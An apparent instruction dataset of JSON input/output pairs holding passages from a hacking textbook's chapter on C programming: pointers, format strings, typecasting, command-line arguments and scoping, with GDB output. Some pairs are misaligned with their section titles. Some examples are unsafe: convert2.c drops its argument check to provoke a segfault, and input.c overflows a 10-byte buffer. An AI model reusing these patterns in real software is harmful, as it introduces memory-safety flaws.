address\nof that variable is returned, instead of the variable itself. This operator exists\nboth in GDB and in the C programming language.\n(gdb) x/xw &pointer\n0xbffff7dc: 0xbffff7e0\n(gdb) print &pointer\n$1 = (char **) 0xbffff7dc\n(gdb) print pointer\n$2 = 0xbffff7e0 \"Hello, world!\\n\"\n(gdb)\nWhen the address-of operator is used, the pointer variable is shown to\nbe located at the address 0xbffff7dc in memory, and it contains the address\n0xbffff7e0.\nThe address-of operator is often used in conjunction with pointers, since\npointers contain memory addresses. The addressof.c program demonstrates\nthe address-of operator being used to put the address of an integer variable\ninto a pointer. This line is shown in bold below.\nProgramming 45\naddressof.c\n#include <stdio.h>\nint main() {\nint int_var = 5;\nint *int_ptr;\nint_ptr = &int_var; // put the address of int_var into int_ptr\n}\nThe program itself doesn’t actually output anything, but you can probably\nguess what happens, even before debugging with GDB.\nreader@hacking:~/booksrc $ gcc -g addressof.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list\n1 #include <stdio.h>\n2\n3 int main() {\n4 int int_var = 5;\n5 int *int_ptr;\n6\n7 int_ptr = &int_var; // Put the address of int_var into int_ptr.\n8 }\n(gdb) break 8\nBreakpoint 1 at 0x8048361: file addressof.c, line 8.\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\nBreakpoint 1, main () at addressof.c:8\n8 }\n(gdb) print int_var\n$1 = 5\n(gdb) print &int_var\n$2 = (int *) 0xbffff804\n(gdb) print int_ptr\n$3 = (int *) 0xbffff804\n(gdb) print &int_ptr\n$4 = (int **) 0xbffff800\n(gdb)\nAs usual, a breakpoint is set and the program is executed in the\ndebugger. At this point the majority of the program has executed. The first\nprint command shows the value of int_var, and the second shows its address\nusing the address-of operator. The next two print commands show that\nint_ptr contains the address of int_var, and they also show the address of\ntheint_ptr for good measure.\n46 0x200\nAn additional unary operator called the dereference operator exists for use\nwith pointers. This operator will return the data found in the address the\npointer is pointing to, instead of the address itself. It takes the form of an\nasterisk in front of the variable name, similar to the declaration of a pointer.\nOnce again, the dereference operator exists both in GDB and in C. Used in\nGDB, it can retrieve the integer value int_ptr points to.\n(gdb) print *int_ptr\n$5 = 5\nA few additions to the addressof.c code (shown in addressof2.c) will\ndemonstrate all of these concepts. The added printf() functions use format\nparameters, which I’ll explain in the next section. For now, just focus on the\nprogram’s output.\naddressof2.c\n#include <stdio.h>\nint main() {\nint int_var = 5;\nint *int_ptr;\nint_ptr = &int_var; // Put the address of int_var into int_ptr.\nprintf(\"int_ptr = 0x%08x\\n\", int_ptr);\nprintf(\"&int_ptr = 0x%08x\\n\", &int_ptr);\nprintf(\"*int_ptr = 0x%08x\\n\\n\", *int_ptr);\nprintf(\"int_var is located at 0x%08x and contains %d\\n\", &int_var, int_var);\nprintf(\"int_ptr is located at 0x%08x, contains 0x%08x, and points to %d\\n\\n\",\n&int_ptr, int_ptr, *int_ptr);\n}\nThe results of compiling and executing addressof2.c are as follows.\nreader@hacking:~/booksrc $ gcc addressof2.c\nreader@hacking:~/booksrc $ ./a.out\nint_ptr = 0xbffff834\n&int_ptr = 0xbffff830\n*int_ptr = 0x00000005\nint_var is located at 0xbffff834 and contains 5\nint_ptr is located at 0xbffff830, contains 0xbffff834, and points to 5\nreader@hacking:~/booksrc $\nWhen the unary operators are used with pointers, the address-of oper-\nator can be thought of as moving backward, while the dereference operator\nmoves forward in the direction the pointer is pointing.\nProgramming 47"
  },
  {
    "input": "0x264 Format Strings",
    "output": "0x264 Format Strings\nThe printf() function can be used to print more than just fixed strings. This\nfunction can also use format strings to print variables in many different for-\nmats. A format string is just a character string with special escape sequences\nthat tell the function to insert variables printed in a specific format in place\nof the escape sequence. The way the printf() function has been used in the\nprevious programs, the \"Hello, world!\\n\" string technically is the format string;\nhowever, it is devoid of special escape sequences. These escape sequences are\nalso called format parameters, and for each one found in the format string, the\nfunction is expected to take an additional argument. Each format parameter\nbegins with a percent sign (%) and uses a single-character shorthand very\nsimilar to formatting characters used by GDB’s examine command.\nParameter Output Type\n%d Decimal\n%u Unsigned decimal\n%x Hexadecimal\nAll of the preceding format parameters receive their data as values,\nnot pointers to values. There are also some format parameters that expect\npointers, such as the following.\nParameter Output Type\n%s String\n%n Number of bytes written so far\nThe %s format parameter expects to be given a memory address; it prints\nthe data at that memory address until a null byte is encountered. The %n\nformat parameter is unique in that it actually writes data. It also expects to be\ngiven a memory address, and it writes the number of bytes that have been\nwritten so far into that memory address.\nFor now, our focus will just be the format parameters used for displaying\ndata. The fmt_strings.c program shows some examples of different format\nparameters.\nfmt_strings.c\n#include <stdio.h>\nint main() {\nchar string[10];\nint A = -73;\nunsigned int B = 31337;\nstrcpy(string, \"sample\");\n48 0x200\n// Example of printing with different format string\nprintf(\"[A] Dec: %d, Hex: %x, Unsigned: %u\\n\", A, A, A);\nprintf(\"[B] Dec: %d, Hex: %x, Unsigned: %u\\n\", B, B, B);\nprintf(\"[field width on B] 3: '%3u', 10: '%10u', '%08u'\\n\", B, B, B);\nprintf(\"[string] %s Address %08x\\n\", string, string);\n// Example of unary address operator (dereferencing) and a %x format string\nprintf(\"variable A is at address: %08x\\n\", &A);\n}\nIn the preceding code, additional variable arguments are passed to each\nprintf() call for every format parameter in the format string. The final printf()\ncall uses the argument &A, which will provide the address of the variable A.\nThe program’s compilation and execution are as follows.\nreader@hacking:~/booksrc $ gcc -o fmt_strings fmt_strings.c\nreader@hacking:~/booksrc $ ./fmt_strings\n[A] Dec: -73, Hex: ffffffb7, Unsigned: 4294967223\n[B] Dec: 31337, Hex: 7a69, Unsigned: 31337\n[field width on B] 3: '31337', 10: ' 31337', '00031337'\n[string] sample Address bffff870\nvariable A is at address: bffff86c\nreader@hacking:~/booksrc $\nThe first two calls to printf() demonstrate the printing of variables A and B,\nusing different format parameters. Since there are three format parameters\nin each line, the variables A and B need to be supplied three times each. The\n%d format parameter allows for negative values, while %u does not, since it is\nexpecting unsigned values.\nWhen the variable A is printed using the %u format parameter, it appears\nas a very high value. This is because A is a negative number stored in two’s\ncomplement, and the format parameter is trying to print it as if it were an\nunsigned value. Since two’s complement flips all the bits and adds one, the\nvery high bits that used to be zero are now one.\nThe third line in the example, labeled [field width on B], shows the use\nof the field-width option in a format parameter. This is just an integer that\ndesignates the minimum field width for that format parameter. However,\nthis is not a maximum field width—if the value to be outputted is greater\nthan the field width, the field width will be exceeded. This happens when 3 is\nused, since the output data needs 5 bytes. When 10 is used as the field width,\n5 bytes of blank space are outputted before the output data. Additionally, if a\nfield width value begins with a 0, this means the field should be padded with\nzeros. When 08 is used, for example, the output is 00031337.\nThe fourth line, labeled [string], simply shows the use of the %s format\nparameter. Remember that the variable string is actually a pointer containing\nthe address of the string, which works out wonderfully, since the %s format\nparameter expects its data to be passed by reference.\nProgramming 49\nThe final line just shows the address of the variable A, using the unary\naddress operator to dereference the variable. This value is displayed as eight\nhexadecimal digits, padded by zeros.\nAs these examples show, you should use %d for decimal, %u for unsigned,\nand %x for hexadecimal values. Minimum field widths can be set by putting a\nnumber right after the percent sign, and if the field width begins with 0, it\nwill be padded with zeros. The %s parameter can be used to print strings and\nshould be passed the address of the string. So far, so good.\nFormat strings are used by an entire family of standard I/O functions,\nincluding scanf(), which basically works like printf() but is used for input\ninstead of output. One key difference is that the scanf() function expects all\nof its arguments to be pointers, so the arguments must actually be variable\naddresses—not the variables themselves. This can be done using pointer\nvariables or by using the unary address operator to retrieve the address of the\nnormal variables. The input.c program and execution should help explain.\ninput.c\n#include <stdio.h>\n#include <string.h>\nint main() {\nchar message[10];\nint count, i;\nstrcpy(message, \"Hello, world!\");\nprintf(\"Repeat how many times? \");\nscanf(\"%d\", &count);\nfor(i=0; i < count; i++)\nprintf(\"%3d - %s\\n\", i, message);\n}\nIn input.c, the scanf() function is used to set the count variable. The output\nbelow demonstrates its use.\nreader@hacking:~/booksrc $ gcc -o input input.c\nreader@hacking:~/booksrc $ ./input\nRepeat how many times? 3\n0 - Hello, world!\n1 - Hello, world!\n2 - Hello, world!\nreader@hacking:~/booksrc $ ./input\nRepeat how many times? 12\n0 - Hello, world!\n1 - Hello, world!\n2 - Hello, world!\n3 - Hello, world!\n4 - Hello, world!\n5 - Hello, world!\n6 - Hello, world!\n50 0x200"
  },
  {
    "input": "0x265 Typecasting",
    "output": "7 - Hello, world!\n8 - Hello, world!\n9 - Hello, world!\n10 - Hello, world!\n11 - Hello, world!\nreader@hacking:~/booksrc $\nFormat strings are used quite often, so familiarity with them is valuable.\nIn addition, the ability to output the values of variables allows for debugging in\nthe program, without the use of a debugger. Having some form of immediate\nfeedback is fairly vital to the hacker’s learning process, and something as\nsimple as printing the value of a variable can allow for lots of exploitation.\n0x265 Typecasting\nTypecasting is simply a way to temporarily change a variable’s data type, despite\nhow it was originally defined. When a variable is typecast into a different\ntype, the compiler is basically told to treat that variable as if it were the\nnewdata type, but only for that operation. The syntax for typecasting is\nasfollows:\n(typecast_data_type) variable\nThis can be used when dealing with integers and floating-point variables,\nas typecasting.c demonstrates.\ntypecasting.c\n#include <stdio.h>\nint main() {\nint a, b;\nfloat c, d;\na = 13;\nb = 5;\nc = a / b; // Divide using integers.\nd = (float) a / (float) b; // Divide integers typecast as floats.\nprintf(\"[integers]\\t a = %d\\t b = %d\\n\", a, b);\nprintf(\"[floats]\\t c = %f\\t d = %f\\n\", c, d);\n}\nThe results of compiling and executing typecasting.c are as follows.\nreader@hacking:~/booksrc $ gcc typecasting.c\nreader@hacking:~/booksrc $ ./a.out\n[integers] a = 13 b = 5\n[floats] c = 2.000000 d = 2.600000\nreader@hacking:~/booksrc $\nProgramming 51\nAs discussed earlier, dividing the integer 13 by 5 will round down to the\nincorrect answer of 2, even if this value is being stored into a floating-point\nvariable. However, if these integer variables are typecast into floats, they will\nbe treated as such. This allows for the correct calculation of 2.6.\nThis example is illustrative, but where typecasting really shines is when it\nis used with pointer variables. Even though a pointer is just a memory address,\nthe C compiler still demands a data type for every pointer. One reason for\nthis is to try to limit programming errors. An integer pointer should only\npoint to integer data, while a character pointer should only point to char-\nacter data. Another reason is for pointer arithmetic. An integer is four bytes\nin size, while a character only takes up a single byte. The pointer_types.c pro-\ngram will demonstrate and explain these concepts further. This code uses the\nformat parameter %p to output memory addresses. This is shorthand meant\nfor displaying pointers and is basically equivalent to 0x%08x.\npointer_types.c\n#include <stdio.h>\nint main() {\nint i;\nchar char_array[5] = {'a', 'b', 'c', 'd', 'e'};\nint int_array[5] = {1, 2, 3, 4, 5};\nchar *char_pointer;\nint *int_pointer;\nchar_pointer = char_array;\nint_pointer = int_array;\nfor(i=0; i < 5; i++) { // Iterate through the int array with the int_pointer.\nprintf(\"[integer pointer] points to %p, which contains the integer %d\\n\",\nint_pointer, *int_pointer);\nint_pointer = int_pointer + 1;\n}\nfor(i=0; i < 5; i++) { // Iterate through the char array with the char_pointer.\nprintf(\"[char pointer] points to %p, which contains the char '%c'\\n\",\nchar_pointer, *char_pointer);\nchar_pointer = char_pointer + 1;\n}\n}\nIn this code two arrays are defined in memory—one containing integer\ndata and the other containing character data. Two pointers are also defined,\none with the integer data type and one with the character data type, and they\nare set to point at the start of the corresponding data arrays. Two separate for\nloops iterate through the arrays using pointer arithmetic to adjust the pointer\nto point at the next value. In the loops, when the integer and character values\n52 0x200\nare actually printed with the %d and %c format parameters, notice that the\ncorresponding printf() arguments must dereference the pointer variables.\nThis is done using the unary * operator and has been marked above\ninbold.\nreader@hacking:~/booksrc $ gcc pointer_types.c\nreader@hacking:~/booksrc $ ./a.out\n[integer pointer] points to 0xbffff7f0, which contains the integer 1\n[integer pointer] points to 0xbffff7f4, which contains the integer 2\n[integer pointer] points to 0xbffff7f8, which contains the integer 3\n[integer pointer] points to 0xbffff7fc, which contains the integer 4\n[integer pointer] points to 0xbffff800, which contains the integer 5\n[char pointer] points to 0xbffff810, which contains the char 'a'\n[char pointer] points to 0xbffff811, which contains the char 'b'\n[char pointer] points to 0xbffff812, which contains the char 'c'\n[char pointer] points to 0xbffff813, which contains the char 'd'\n[char pointer] points to 0xbffff814, which contains the char 'e'\nreader@hacking:~/booksrc $\nEven though the same value of 1 is added to int_pointer and char_pointer\nin their respective loops, the compiler increments the pointer’s addresses by\ndifferent amounts. Since a char is only 1 byte, the pointer to the next char\nwould naturally also be 1 byte over. But since an integer is 4 bytes, a pointer\nto the next integer has to be 4 bytes over.\nIn pointer_types2.c, the pointers are juxtaposed such that the int_pointer\npoints to the character data and vice versa. The major changes to the code\nare marked in bold.\npointer_types2.c\n#include <stdio.h>\nint main() {\nint i;\nchar char_array[5] = {'a', 'b', 'c', 'd', 'e'};\nint int_array[5] = {1, 2, 3, 4, 5};\nchar *char_pointer;\nint *int_pointer;\nchar_pointer = int_array; // The char_pointer and int_pointer now\nint_pointer = char_array; // point to incompatible data types.\nfor(i=0; i < 5; i++) { // Iterate through the int array with the int_pointer.\nprintf(\"[integer pointer] points to %p, which contains the char '%c'\\n\",\nint_pointer, *int_pointer);\nint_pointer = int_pointer + 1;\n}\nfor(i=0; i < 5; i++) { // Iterate through the char array with the char_pointer.\nProgramming 53\nprintf(\"[char pointer] points to %p, which contains the integer %d\\n\",\nchar_pointer, *char_pointer);\nchar_pointer = char_pointer + 1;\n}\n}\nThe output below shows the warnings spewed forth from the compiler.\nreader@hacking:~/booksrc $ gcc pointer_types2.c\npointer_types2.c: In function `main':\npointer_types2.c:12: warning: assignment from incompatible pointer type\npointer_types2.c:13: warning: assignment from incompatible pointer type\nreader@hacking:~/booksrc $\nIn an attempt to prevent programming mistakes, the compiler gives warn-\nings about pointers that point to incompatible data types. But the compiler\nand perhaps the programmer are the only ones that care about a pointer’s\ntype. In the compiled code, a pointer is nothing more than a memory\naddress, so the compiler will still compile the code if a pointer points to\nanincompatible data type—it simply warns the programmer to anticipate\nunexpected results.\nreader@hacking:~/booksrc $ ./a.out\n[integer pointer] points to 0xbffff810, which contains the char 'a'\n[integer pointer] points to 0xbffff814, which contains the char 'e'\n[integer pointer] points to 0xbffff818, which contains the char '8'\n[integer pointer] points to 0xbffff81c, which contains the char '\n[integer pointer] points to 0xbffff820, which contains the char '?'\n[char pointer] points to 0xbffff7f0, which contains the integer 1\n[char pointer] points to 0xbffff7f1, which contains the integer 0\n[char pointer] points to 0xbffff7f2, which contains the integer 0\n[char pointer] points to 0xbffff7f3, which contains the integer 0\n[char pointer] points to 0xbffff7f4, which contains the integer 2\nreader@hacking:~/booksrc $\nEven though the int_pointer points to character data that only contains\n5 bytes of data, it is still typed as an integer. This means that adding 1 to the\npointer will increment the address by 4 each time. Similarly, the char_pointer’s\naddress is only incremented by 1 each time, stepping through the 20 bytes of\ninteger data (five 4-byte integers), one byte at a time. Once again, the little-\nendian byte order of the integer data is apparent when the 4-byte integer is\nexamined one byte at a time. The 4-byte value of 0x00000001 is actually stored\nin memory as 0x01, 0x00, 0x00, 0x00.\nThere will be situations like this in which you are using a pointer that\npoints to data with a conflicting type. Since the pointer type determines the\nsize of the data it points to, it’s important that the type is correct. As you can\nsee in pointer_types3.c below, typecasting is just a way to change the type of a\nvariable on the fly.\n54 0x200\npointer_types3.c\n#include <stdio.h>\nint main() {\nint i;\nchar char_array[5] = {'a', 'b', 'c', 'd', 'e'};\nint int_array[5] = {1, 2, 3, 4, 5};\nchar *char_pointer;\nint *int_pointer;\nchar_pointer = (char *) int_array; // Typecast into the\nint_pointer = (int *) char_array; // pointer's data type.\nfor(i=0; i < 5; i++) { // Iterate through the int array with the int_pointer.\nprintf(\"[integer pointer] points to %p, which contains the char '%c'\\n\",\nint_pointer, *int_pointer);\nint_pointer = (int *) ((char *) int_pointer + 1);\n}\nfor(i=0; i < 5; i++) { // Iterate through the char array with the char_pointer.\nprintf(\"[char pointer] points to %p, which contains the integer %d\\n\",\nchar_pointer, *char_pointer);\nchar_pointer = (char *) ((int *) char_pointer + 1);\n}\n}\nIn this code, when the pointers are initially set, the data is typecast into\nthe pointer’s data type. This will prevent the C compiler from complaining\nabout the conflicting data types; however, any pointer arithmetic will still be\nincorrect. To fix that, when 1 is added to the pointers, they must first be type-\ncast into the correct data type so the address is incremented by the correct\namount. Then this pointer needs to be typecast back into the pointer’s data\ntype once again. It doesn’t look too pretty, but it works.\nreader@hacking:~/booksrc $ gcc pointer_types3.c\nreader@hacking:~/booksrc $ ./a.out\n[integer pointer] points to 0xbffff810, which contains the char 'a'\n[integer pointer] points to 0xbffff811, which contains the char 'b'\n[integer pointer] points to 0xbffff812, which contains the char 'c'\n[integer pointer] points to 0xbffff813, which contains the char 'd'\n[integer pointer] points to 0xbffff814, which contains the char 'e'\n[char pointer] points to 0xbffff7f0, which contains the integer 1\n[char pointer] points to 0xbffff7f4, which contains the integer 2\n[char pointer] points to 0xbffff7f8, which contains the integer 3\n[char pointer] points to 0xbffff7fc, which contains the integer 4\n[char pointer] points to 0xbffff800, which contains the integer 5\nreader@hacking:~/booksrc $\nProgramming 55\nNaturally, it is far easier just to use the correct data type for pointers\ninthe first place; however, sometimes a generic, typeless pointer is desired.\nIn C, a void pointer is a typeless pointer, defined by the void keyword.\nExperimenting with void pointers quickly reveals a few things about typeless\npointers. First, pointers cannot be dereferenced unless they have a type.\nInorder to retrieve the value stored in the pointer’s memory address, the\ncompiler must first know what type of data it is. Secondly, void pointers must\nalso be typecast before doing pointer arithmetic. These are fairly intuitive\nlimitations, which means that a void pointer’s main purpose is to simply hold\na memory address.\nThe pointer_types3.c program can be modified to use a single void\npointer by typecasting it to the proper type each time it’s used. The compiler\nknows that a void pointer is typeless, so any type of pointer can be stored in a\nvoid pointer without typecasting. This also means a void pointer must always\nbe typecast when dereferencing it, however. These differences can be seen in\npointer_types4.c, which uses a void pointer.\npointer_types4.c\n#include <stdio.h>\nint main() {\nint i;\nchar char_array[5] = {'a', 'b', 'c', 'd', 'e'};\nint int_array[5] = {1, 2, 3, 4, 5};\nvoid *void_pointer;\nvoid_pointer = (void *) char_array;\nfor(i=0; i < 5; i++) { // Iterate through the int array with the int_pointer.\nprintf(\"[char pointer] points to %p, which contains the char '%c'\\n\",\nvoid_pointer, *((char *) void_pointer));\nvoid_pointer = (void *) ((char *) void_pointer + 1);\n}\nvoid_pointer = (void *) int_array;\nfor(i=0; i < 5; i++) { // Iterate through the int array with the int_pointer.\nprintf(\"[integer pointer] points to %p, which contains the integer %d\\n\",\nvoid_pointer, *((int *) void_pointer));\nvoid_pointer = (void *) ((int *) void_pointer + 1);\n}\n}\nThe results of compiling and executing pointer_types4.c are as\nfollows.\n56 0x200\nreader@hacking:~/booksrc $ gcc pointer_types4.c\nreader@hacking:~/booksrc $ ./a.out\n[char pointer] points to 0xbffff810, which contains the char 'a'\n[char pointer] points to 0xbffff811, which contains the char 'b'\n[char pointer] points to 0xbffff812, which contains the char 'c'\n[char pointer] points to 0xbffff813, which contains the char 'd'\n[char pointer] points to 0xbffff814, which contains the char 'e'\n[integer pointer] points to 0xbffff7f0, which contains the integer 1\n[integer pointer] points to 0xbffff7f4, which contains the integer 2\n[integer pointer] points to 0xbffff7f8, which contains the integer 3\n[integer pointer] points to 0xbffff7fc, which contains the integer 4\n[integer pointer] points to 0xbffff800, which contains the integer 5\nreader@hacking:~/booksrc $\nThe compilation and output of this pointer_types4.c is basically the same\nas that for pointer_types3.c. The void pointer is really just holding the memory\naddresses, while the hard-coded typecasting is telling the compiler to use the\nproper types whenever the pointer is used.\nSince the type is taken care of by the typecasts, the void pointer is truly\nnothing more than a memory address. With the data types defined by type-\ncasting, anything that is big enough to hold a four-byte value can work the\nsame way as a void pointer. In pointer_types5.c, an unsigned integer is used\nto store this address.\npointer_types5.c\n#include <stdio.h>\nint main() {\nint i;\nchar char_array[5] = {'a', 'b', 'c', 'd', 'e'};\nint int_array[5] = {1, 2, 3, 4, 5};\nunsigned int hacky_nonpointer;\nhacky_nonpointer = (unsigned int) char_array;\nfor(i=0; i < 5; i++) { // Iterate through the int array with the int_pointer.\nprintf(\"[hacky_nonpointer] points to %p, which contains the char '%c'\\n\",\nhacky_nonpointer, *((char *) hacky_nonpointer));\nhacky_nonpointer = hacky_nonpointer + sizeof(char);\n}\nhacky_nonpointer = (unsigned int) int_array;\nfor(i=0; i < 5; i++) { // Iterate through the int array with the int_pointer.\nprintf(\"[hacky_nonpointer] points to %p, which contains the integer %d\\n\",\nhacky_nonpointer, *((int *) hacky_nonpointer));\nhacky_nonpointer = hacky_nonpointer + sizeof(int);\n}\n}\nProgramming 57"
  },
  {
    "input": "0x266 Command-Line Arguments",
    "output": "This is rather hacky, but since this integer value is typecast into the\nproper pointer types when it is assigned and dereferenced, the end result is\nthe same. Notice that instead of typecasting multiple times to do pointer\narithmetic on an unsigned integer (which isn’t even a pointer), the sizeof()\nfunction is used to achieve the same result using normal arithmetic.\nreader@hacking:~/booksrc $ gcc pointer_types5.c\nreader@hacking:~/booksrc $ ./a.out\n[hacky_nonpointer] points to 0xbffff810, which contains the char 'a'\n[hacky_nonpointer] points to 0xbffff811, which contains the char 'b'\n[hacky_nonpointer] points to 0xbffff812, which contains the char 'c'\n[hacky_nonpointer] points to 0xbffff813, which contains the char 'd'\n[hacky_nonpointer] points to 0xbffff814, which contains the char 'e'\n[hacky_nonpointer] points to 0xbffff7f0, which contains the integer 1\n[hacky_nonpointer] points to 0xbffff7f4, which contains the integer 2\n[hacky_nonpointer] points to 0xbffff7f8, which contains the integer 3\n[hacky_nonpointer] points to 0xbffff7fc, which contains the integer 4\n[hacky_nonpointer] points to 0xbffff800, which contains the integer 5\nreader@hacking:~/booksrc $\nThe important thing to remember about variables in C is that the com-\npiler is the only thing that cares about a variable’s type. In the end, after the\nprogram has been compiled, the variables are nothing more than memory\naddresses. This means that variables of one type can easily be coerced into\nbehaving like another type by telling the compiler to typecast them into the\ndesired type.\n0x266 Command-Line Arguments\nMany nongraphical programs receive input in the form of command-line\narguments. Unlike inputting with scanf(), command-line arguments don’t\nrequire user interaction after the program has begun execution. This tends\nto be more efficient and is a useful input method.\nIn C, command-line arguments can be accessed in the main() function by\nincluding two additional arguments to the function: an integer and a pointer\nto an array of strings. The integer will contain the number of arguments, and\nthe array of strings will contain each of those arguments. The commandline.c\nprogram and its execution should explain things.\ncommandline.c\n#include <stdio.h>\nint main(int arg_count, char *arg_list[]) {\nint i;\nprintf(\"There were %d arguments provided:\\n\", arg_count);\nfor(i=0; i < arg_count; i++)\nprintf(\"argument #%d\\t-\\t%s\\n\", i, arg_list[i]);\n}\n58 0x200\nreader@hacking:~/booksrc $ gcc -o commandline commandline.c\nreader@hacking:~/booksrc $ ./commandline\nThere were 1 arguments provided:\nargument #0 - ./commandline\nreader@hacking:~/booksrc $ ./commandline this is a test\nThere were 5 arguments provided:\nargument #0 - ./commandline\nargument #1 - this\nargument #2 - is\nargument #3 - a\nargument #4 - test\nreader@hacking:~/booksrc $\nThe zeroth argument is always the name of the executing binary, and\nthe rest of the argument array (often called an argument vector) contains the\nremaining arguments as strings.\nSometimes a program will want to use a command-line argument as an\ninteger as opposed to a string. Regardless of this, the argument is passed in\nasa string; however, there are standard conversion functions. Unlike simple\ntypecasting, these functions can actually convert character arrays containing\nnumbers into actual integers. The most common of these functions is atoi(),\nwhich is short for ASCII to integer. This function accepts a pointer to a string\nas its argument and returns the integer value it represents. Observe its usage\nin convert.c.\nconvert.c\n#include <stdio.h>\nvoid usage(char *program_name) {\nprintf(\"Usage: %s <message> <# of times to repeat>\\n\", program_name);\nexit(1);\n}\nint main(int argc, char *argv[]) {\nint i, count;\nif(argc < 3) // If fewer than 3 arguments are used,\nusage(argv[0]); // display usage message and exit.\ncount = atoi(argv[2]); // Convert the 2nd arg into an integer.\nprintf(\"Repeating %d times..\\n\", count);\nfor(i=0; i < count; i++)\nprintf(\"%3d - %s\\n\", i, argv[1]); // Print the 1st arg.\n}\nThe results of compiling and executing convert.c are as follows.\nreader@hacking:~/booksrc $ gcc convert.c\nreader@hacking:~/booksrc $ ./a.out\nUsage: ./a.out <message> <# of times to repeat>\nProgramming 59\nreader@hacking:~/booksrc $ ./a.out 'Hello, world!' 3\nRepeating 3 times..\n0 - Hello, world!\n1 - Hello, world!\n2 - Hello, world!\nreader@hacking:~/booksrc $\nIn the preceding code, an if statement makes sure that three arguments\nare used before these strings are accessed. If the program tries to access mem-\nory that doesn’t exist or that the program doesn’t have permission to read,\nthe program will crash. In C it’s important to check for these types of condi-\ntions and handle them in program logic. If the error-checking if statement is\ncommented out, this memory violation can be explored. The convert2.c\nprogram should make this more clear.\nconvert2.c\n#include <stdio.h>\nvoid usage(char *program_name) {\nprintf(\"Usage: %s <message> <# of times to repeat>\\n\", program_name);\nexit(1);\n}\nint main(int argc, char *argv[]) {\nint i, count;\n// if(argc < 3) // If fewer than 3 arguments are used,\n// usage(argv[0]); // display usage message and exit.\ncount = atoi(argv[2]); // Convert the 2nd arg into an integer.\nprintf(\"Repeating %d times..\\n\", count);\nfor(i=0; i < count; i++)\nprintf(\"%3d - %s\\n\", i, argv[1]); // Print the 1st arg.\n}\nThe results of compiling and executing convert2.c are as follows.\nreader@hacking:~/booksrc $ gcc convert2.c\nreader@hacking:~/booksrc $ ./a.out test\nSegmentation fault (core dumped)\nreader@hacking:~/booksrc $\nWhen the program isn’t given enough command-line arguments, it still\ntries to access elements of the argument array, even though they don’t exist.\nThis results in the program crashing due to a segmentation fault.\nMemory is split into segments (which will be discussed later), and some\nmemory addresses aren’t within the boundaries of the memory segments the\nprogram is given access to. When the program attempts to access an address\nthat is out of bounds, it will crash and die in what’s called a segmentation fault.\nThis effect can be explored further with GDB.\n60 0x200\nreader@hacking:~/booksrc $ gcc -g convert2.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) run test\nStarting program: /home/reader/booksrc/a.out test\nProgram received signal SIGSEGV, Segmentation fault.\n0xb7ec819b in ?? () from /lib/tls/i686/cmov/libc.so.6\n(gdb) where\n#0 0xb7ec819b in ?? () from /lib/tls/i686/cmov/libc.so.6\n#1 0xb800183c in ?? ()\n#2 0x00000000 in ?? ()\n(gdb) break main\nBreakpoint 1 at 0x8048419: file convert2.c, line 14.\n(gdb) run test\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/reader/booksrc/a.out test\nBreakpoint 1, main (argc=2, argv=0xbffff894) at convert2.c:14\n14 count = atoi(argv[2]); // convert the 2nd arg into an integer\n(gdb) cont\nContinuing.\nProgram received signal SIGSEGV, Segmentation fault.\n0xb7ec819b in ?? () from /lib/tls/i686/cmov/libc.so.6\n(gdb) x/3xw 0xbffff894\n0xbffff894: 0xbffff9b3 0xbffff9ce 0x00000000\n(gdb) x/s 0xbffff9b3\n0xbffff9b3: \"/home/reader/booksrc/a.out\"\n(gdb) x/s 0xbffff9ce\n0xbffff9ce: \"test\"\n(gdb) x/s 0x00000000\n0x0: <Address 0x0 out of bounds>\n(gdb) quit\nThe program is running. Exit anyway? (y or n) y\nreader@hacking:~/booksrc $\nThe program is executed with a single command-line argument of test\nwithin GDB, which causes the program to crash. The where command will\nsometimes show a useful backtrace of the stack; however, in this case, the\nstack was too badly mangled in the crash. A breakpoint is set on main and\nthe program is re-executed to get the value of the argument vector (shown in\nbold). Since the argument vector is a pointer to list of strings, it is actually a\npointer to a list of pointers. Using the command x/3xw to examine the first\nthree memory addresses stored at the argument vector’s address shows that\nthey are themselves pointers to strings. The first one is the zeroth argument,\nthe second is the test argument, and the third is zero, which is out of bounds.\nWhen the program tries to access this memory address, it crashes with a\nsegmentation fault.\nProgramming 61"
  },
  {
    "input": "0x267 Variable Scoping",
    "output": "0x267 Variable Scoping\nAnother interesting concept regarding memory in C is variable scoping or\ncontext—in particular, the contexts of variables within functions. Each func-\ntion has its own set of local variables, which are independent of everything\nelse. In fact, multiple calls to the same function all have their own contexts.\nYou can use the printf() function with format strings to quickly explore this;\ncheck it out in scope.c.\nscope.c\n#include <stdio.h>\nvoid func3() {\nint i = 11;\nprintf(\"\\t\\t\\t[in func3] i = %d\\n\", i);\n}\nvoid func2() {\nint i = 7;\nprintf(\"\\t\\t[in func2] i = %d\\n\", i);\nfunc3();\nprintf(\"\\t\\t[back in func2] i = %d\\n\", i);\n}\nvoid func1() {\nint i = 5;\nprintf(\"\\t[in func1] i = %d\\n\", i);\nfunc2();\nprintf(\"\\t[back in func1] i = %d\\n\", i);\n}\nint main() {\nint i = 3;\nprintf(\"[in main] i = %d\\n\", i);\nfunc1();\nprintf(\"[back in main] i = %d\\n\", i);\n}\nThe output of this simple program demonstrates nested function calls.\nreader@hacking:~/booksrc $ gcc scope.c\nreader@hacking:~/booksrc $ ./a.out\n[in main] i = 3\n[in func1] i = 5\n[in func2] i = 7\n[in func3] i = 11\n[back in func2] i = 7\n[back in func1] i = 5\n[back in main] i = 3\nreader@hacking:~/booksrc $\n62 0x200\nIn each function, the variable i is set to a different value and printed.\nNotice that within the main() function, the variable i is 3, even after calling\nfunc1() where the variable i is 5. Similarly, within func1() the variable i\nremains 5, even after calling func2() where i is 7, and so forth. The best\nway to think of this is that each function call has its own version of the\nvariable i.\nVariables can also have a global scope, which means they will persist\nacross all functions. Variables are global if they are defined at the beginning\nof the code, outside of any functions. In the scope2.c example code shown\nbelow, the variable j is declared globally and set to 42. This variable can be\nread from and written to by any function, and the changes to it will persist\nbetween functions.\nscope2.c\n#include <stdio.h>\nint j = 42; // j is a global variable.\nvoid func3() {\nint i = 11, j = 999; // Here, j is a local variable of func3().\nprintf(\"\\t\\t\\t[in func3] i = %d, j = %d\\n\", i, j);\n}\nvoid func2() {\nint i = 7;\nprintf(\"\\t\\t[in func2] i = %d, j = %d\\n\", i, j);\nprintf(\"\\t\\t[in func2] 